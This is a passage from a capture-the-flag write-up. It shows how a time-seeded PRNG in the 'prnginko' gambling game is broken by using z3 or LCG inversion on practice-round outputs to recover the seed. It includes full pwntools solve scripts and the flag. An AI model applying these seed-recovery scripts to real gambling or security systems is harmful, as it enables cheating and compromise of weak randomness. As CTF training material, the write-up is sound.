&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; var8; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+0h] [rbp+0h]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;var8 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)a_value &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC5D8A3FF84711ALL&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)time_seed;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  a_value &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;HIDWORD&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;var8 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  time_seed &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;var8 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)time_seed;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This issue caused us a lot of pain as well.&lt;/p&gt;
&lt;p&gt;Anyways, we then collect the game&amp;rsquo;s PRNG outputs from the result of some practice rounds.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_game_output&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;p&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# play practice round&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    outputs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        game_output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; game_output[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;L&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            outputs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; game_output[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;R&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            outputs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; outputs
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;trials &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;game_outputs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; trial &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(trials):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    game_outputs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;extend(get_game_output())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;game_outputs &lt;span style=&#34;color:#e6db74&#34;&gt;= }&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Doing 8 trials, which gets 64 bits from the game should be enough for z3 to compute a unique solution (you might imagine if we had only 1 trial, there could be many possible &lt;code&gt;time_seed&lt;/code&gt;s that can result in the same output).&lt;/p&gt;
&lt;p&gt;Then we simply tell z3 that these values should be equal, and also add that &lt;code&gt;time_seed&lt;/code&gt; should be within the 32 integer range.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;prng_output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;shift_r_value &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a_value &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;time_seed &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; BitVec(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;time_seed&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;time_seed_copy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time_seed
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./prnginko&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./prnginko&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;trials &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;game_outputs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; trial &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(trials):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    game_outputs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;extend(get_game_output())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Solver()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(time_seed &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(time_seed &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; bit &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; game_outputs:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(prng_main() &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; bit)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;check() &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; sat
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;model()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;correct_time_seed &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(m[time_seed_copy]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;as_long())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;correct_time_seed &lt;span style=&#34;color:#e6db74&#34;&gt;= }&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Also note that above I have made a copy of &lt;code&gt;time_seed&lt;/code&gt; called &lt;code&gt;time_seed_copy&lt;/code&gt; as &lt;code&gt;time_seed&lt;/code&gt; was being overwritten in the PRNG functions, thus a Z3 declaration had to be retained to retrieve the time from the model.&lt;/p&gt;
&lt;h4 id=&#34;getting-the-flag&#34;&gt;Getting the flag&lt;/h4&gt;
&lt;p&gt;Now that our PRNG is working, and z3 gives us the correct &lt;code&gt;time_seed&lt;/code&gt;, we can finally get the flag. All we do is to count how many times we need to reroll the PRNG until it gives us all &lt;code&gt;0&lt;/code&gt;&amp;rsquo;s or all &lt;code&gt;1&lt;/code&gt;&amp;rsquo;s (which will give us the max points), then use a game round.&lt;/p&gt;
&lt;p&gt;Final code:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;3&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;3&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;solve.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
from z3 import *
from pwn import *
# local file of our PRNG to avoid z3 symbolic values being used
import prng

def prng_subpart():
    global time_seed, a_value

    output = a_value - 0xC5D8A3FF84711A * time_seed
    output = output % (2**64)
    a_value = LShR(output, 32)
    time_seed = output % (2**32)
    return time_seed

def prng_main():
    global shift_r_value, prng_output

    if shift_r_value &amp;lt; 0:
        shift_r_value = 31
        prng_output = prng_subpart()
    output = LShR(prng_output, shift_r_value) &amp;amp; 1
    shift_r_value -= 1
    return output

def get_game_output():
    p.recvuntil(b&amp;#34;&amp;gt; &amp;#34;)
    p.sendline(b&amp;#34;p&amp;#34;) # play practice round
    
    outputs = []
    for i in range(8):
        game_output = p.recvline().decode()
        if game_output[0] == &amp;#34;L&amp;#34;:
            outputs.append(0)
        elif game_output[0] == &amp;#34;R&amp;#34;:
            outputs.append(1)
        p.recvline()
        p.recvline()
    return outputs

def play_game_round():
    p.recvuntil(b&amp;#34;&amp;gt;&amp;#34;)
    p.sendline(b&amp;#34;g&amp;#34;) # play game round

context.binary = elf = ELF(&amp;#34;./prnginko&amp;#34;)
# p = process(&amp;#34;./prnginko&amp;#34;)
p = remote(&amp;#34;prnginko.chal.cybears.io&amp;#34;, 2323)

game_rounds = 10

prng_output = None
shift_r_value = -1
a_value = 1
time_seed = BitVec(&amp;#39;time_seed&amp;#39;, 64)
time_seed_copy = time_seed

trials = 8
game_outputs = []
for trial in range(trials):
    game_outputs.extend(get_game_output())

s = Solver()
s.add(time_seed &amp;gt;= 0)
s.add(time_seed &amp;lt;= 2**32)
for bit in game_outputs:
    s.add(prng_main() == bit)

assert s.check() == sat
m = s.model()
correct_time_seed = int(m[time_seed_copy].as_long())
print(f&amp;#34;{correct_time_seed = }&amp;#34;)

prng.set_time_seed(correct_time_seed)

# need to fast forward our PRNG to match the game&amp;#39;s state
# as earlier we played 8 rounds to get the outputs.
# must times 8 because each round has 8 outputs
for trial in range(trials * 8):
    prng.prng_main()

for game_round in range(game_rounds):
    practice_round_count = 0
    while True:
        next_round_result = [prng.prng_main() for _ in range(8)]
        # check if all 1&amp;#39;s or all 0&amp;#39;s
        if len(set(next_round_result)) == 1:
            # send number of practice rounds we want to
            # play at same time to avoid taking too
            # long to recieve data
            p.send(b&amp;#34;p\n&amp;#34; * practice_round_count)
            play_game_round()
            break
        practice_round_count &amp;#43;= 1

p.interactive()

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;4&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;4&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;prng.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
def prng_subpart():
    global time_seed, a_value

    output = a_value - 0xC5D8A3FF84711A * time_seed
    output = output % (2**64)
    a_value = output &amp;gt;&amp;gt; 32
    time_seed = output % (2**32)
    return time_seed

def prng_main():
    global shift_r_value, prng_output

    if shift_r_value &amp;lt; 0:
        shift_r_value = 31
        prng_output = prng_subpart()
    output = (prng_output &amp;gt;&amp;gt; shift_r_value) &amp;amp; 1
    shift_r_value -= 1
    return output

def set_time_seed(_time_seed):
    global prng_output, shift_r_value, a_value, time_seed

    prng_output = None
    shift_r_value = -1
    a_value = 1
    time_seed = _time_seed
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;



  &lt;img src=&#34;./img/finally.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 80%&#34;  /&gt;


&lt;p&gt;&lt;code&gt;cybears{Pr3d1ctable_gam3_for_P3rf3ct_Gambl1ng}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Note that in the final solve script, I imported a separate python file named &lt;code&gt;prng&lt;/code&gt; with the same PRNG implementation for several reasons:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;In z3, &lt;code&gt;LShR&lt;/code&gt; should be used instead of &lt;code&gt;&amp;gt;&amp;gt;&lt;/code&gt; to perform right shifts (more info &lt;a href=&#34;https://stackoverflow.com/questions/25532563/why-does-z3-say-that-this-equation-is-not-satisfiable-when-i-have-input-that-is&#34;&gt;here&lt;/a&gt;).&lt;/li&gt;
&lt;li&gt;Symbolic values were passed through the functions making it return another symbolic value when called. Basically I wanted it to return a number not an equation.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I would like to thank &lt;a href=&#34;https://twitter.com/stacksparrow4&#34;&gt;&lt;code&gt;ssparrow&lt;/code&gt;&lt;/a&gt; for helping me debug the code and for finding the issues that stumped me for hours.&lt;/p&gt;
&lt;h4 id=&#34;a-much-simpler-solution&#34;&gt;A much simpler solution&lt;/h4&gt;
&lt;p&gt;After the CTF ended, I talked to &lt;code&gt;Neobeo&lt;/code&gt; who played for Skateboarding Roombas in this CTF about the challenge.&lt;/p&gt;
&lt;p&gt;He revealed a much easier solution that didn&amp;rsquo;t need any messing around in z3 - the PRNG was actually an LCG! In case you didn&amp;rsquo;t know, an LCG is in the form&lt;/p&gt;
&lt;p&gt;$$S_{n+1} = S_n \times a + b \bmod{m}$$&lt;/p&gt;
&lt;p&gt;where the next term is the current term &lt;code&gt;S_n&lt;/code&gt; times &lt;code&gt;a&lt;/code&gt; plus &lt;code&gt;b&lt;/code&gt;, where &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; are constants. In this case &lt;code&gt;S_n&lt;/code&gt; was &lt;code&gt;time_seed&lt;/code&gt;, and the modulus &lt;code&gt;m&lt;/code&gt; was the 32 bit integer limit. Despite having done LCG challenges in the past, I somehow failed to recognise this!&lt;/p&gt;
&lt;p&gt;The function &lt;code&gt;main_prng&lt;/code&gt; was simply returning the MSB (first bit) of the PRNG output, and shifting it to return all bits of the output before retrieving a new random number. &lt;code&gt;prng_subpart&lt;/code&gt; was the actual PRNG, which was an LCG implementation.&lt;/p&gt;
&lt;p&gt;Recovering &lt;code&gt;time_seed&lt;/code&gt; was trivial now that we recognise it as a LCG - we simply need the whole random number returned by &lt;code&gt;prng_subpart&lt;/code&gt; which we can get by playing 4 practice rounds (as each round returns 8 bits).&lt;/p&gt;
&lt;p&gt;Now we simply solve for &lt;code&gt;time_seed&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;$$
S_{n+1} \equiv S_n \times a + b \pmod{2^{32}} \newline
S_n \equiv a^{-1}(S_{n+1} - b) \pmod{2^{32}}
$$&lt;/p&gt;
&lt;p&gt;where &lt;code&gt;S_n&lt;/code&gt; is &lt;code&gt;time_seed&lt;/code&gt;, &lt;code&gt;b&lt;/code&gt; is &lt;code&gt;a_value&lt;/code&gt;, &lt;code&gt;a&lt;/code&gt; is &lt;code&gt;-0xC5D8A3FF84711A&lt;/code&gt; and &lt;code&gt;S_n+1&lt;/code&gt; is the 32 bit value returned by playing 4 rounds.&lt;/p&gt;
&lt;p&gt;There is just a slight issue - since both &lt;code&gt;-0xC5D8A3FF84711A&lt;/code&gt; and &lt;code&gt;2**32&lt;/code&gt; are even, there is no modular inverse! We can get around this by dividing everything by two.&lt;/p&gt;
&lt;p&gt;$$
\frac{S_{n+1}}{2} \equiv S_n \times \frac{a}{2} + \frac{b}{2} \pmod{2^{32}} \newline
S_n = (\frac{a}{2})^{-1} \times \frac{S_{n+1} - b}{2} \pmod{2^{31}}
$$&lt;/p&gt;
&lt;p&gt;Thanks again to &lt;code&gt;Neobeo&lt;/code&gt; for showing me this trick.&lt;/p&gt;
&lt;p&gt;However, by doing this we are left with two possible values as we are now solving over &lt;code&gt;mod 2**31&lt;/code&gt; instead of &lt;code&gt;mod 2**32&lt;/code&gt;, so if &lt;code&gt;time_seed&lt;/code&gt; is over &lt;code&gt;2**31&lt;/code&gt; it will get cut off.&lt;/p&gt;
&lt;p&gt;We can verify which is correct by collecting another set of outputs, and seeding with both of the possible seeds. Alternatively, we can just use two sets of outputs to solve for a distinct value.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;5&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;5&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;alternative_solve.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
from z3 import *
from pwn import *

def prng_subpart():
    global time_seed, a_value

    output = a_value - 0xC5D8A3FF84711A * time_seed
    output = output % (2**64)
    a_value = output &amp;gt;&amp;gt; 32
    time_seed = output % (2**32)
    return time_seed

def prng_main():
    global shift_r_value, prng_output

    if shift_r_value &amp;lt; 0:
        shift_r_value = 31
        prng_output = prng_subpart()
    output = (prng_output &amp;gt;&amp;gt; shift_r_value) &amp;amp; 1
    shift_r_value -= 1
    return output

def get_game_output():
    p.recvuntil(b&amp;#34;&amp;gt; &amp;#34;)
    p.sendline(b&amp;#34;p&amp;#34;) # play practice round
    
    outputs = []
    for i in range(8):
        game_output = p.recvline().decode()
        if game_output[0] == &amp;#34;L&amp;#34;:
            outputs.append(0)
        elif game_output[0] == &amp;#34;R&amp;#34;:
            outputs.append(1)
        p.recvline()
        p.recvline()
    return outputs

def play_game_round():
    p.recvuntil(b&amp;#34;&amp;gt;&amp;#34;)
    p.sendline(b&amp;#34;g&amp;#34;) # play game round

context.binary = elf = ELF(&amp;#34;./prnginko&amp;#34;)
p = process(&amp;#34;./prnginko&amp;#34;)
# p = gdb.debug(&amp;#34;./prnginko&amp;#34;)
# p = remote(&amp;#34;prnginko.chal.cybears.io&amp;#34;, 2323)

game_rounds = 10
modulus = 2**32

trials = 4 # get the whole 32-bit value
game_outputs = []
for trial in range(trials):
    game_outputs.extend(get_game_output())

print(f&amp;#34;{game_outputs = }&amp;#34;)

S_n1 = 0
for i, game_output in enumerate(game_outputs[::-1]):
    S_n1 &amp;#43;= game_output * (2**i)

calculated_time_seed = pow(-0xC5D8A3FF84711A//2, -1, modulus//2) * ((S_n1 - 1) // 2)
calculated_time_seed %= modulus // 2

possible_seed_1 = calculated_time_seed
possible_seed_2 = calculated_time_seed &amp;#43; modulus//2

# get 2nd set of outputs
game_outputs = []
for trial in range(trials):
    game_outputs.extend(get_game_output())

correct_seed = None
#try our first seed
try:
    time_seed = possible_seed_1
    prng_output = None
    shift_r_value = -1
    a_value = 1
    
    #fast forward to game&amp;#39;s 2nd set of outputs
    for _ in range(trials * 8):
        prng_main()

    for game_output in game_outputs:
        assert prng_main() == game_output
    correct_seed = possible_seed_1
except AssertionError:
    time_seed = possible_seed_2
    prng_output = None
    shift_r_value = -1
    a_value = 1

    #fast forward to game&amp;#39;s 2nd set of outputs
    for _ in range(trials * 8):
        prng_main()

    for game_output in game_outputs:
        # just to double check we&amp;#39;re correct
        assert prng_main() == game_output
    correct_seed = possible_seed_2

time_seed = correct_seed
prng_output = None
shift_r_value = -1
a_value = 1

# fast forward to same PRNG state as the game
for _ in range(trials*8 * 2):
    prng_main()

for game_round in range(game_rounds):
    practice_round_count = 0
    while True:
        next_round_result = [prng_main() for _ in range(8)]
        # check if all 1&amp;#39;s or all 0&amp;#39;s
